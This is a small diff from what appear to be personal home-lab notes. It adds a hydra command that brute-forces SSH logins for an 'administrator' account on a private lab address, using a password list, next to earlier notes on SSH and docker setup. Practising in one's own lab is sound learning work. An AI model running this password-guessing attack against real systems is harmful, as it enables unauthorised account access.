@@ -49,6 +49,10 @@ ssh sajib@192.168.174.128
 
 /////now setiing docker 
 
+///setting hydra brute force 
+hydra -l administrator -P password.txt -T 20 192.168.174.129 ssh
+
+
 
 
 
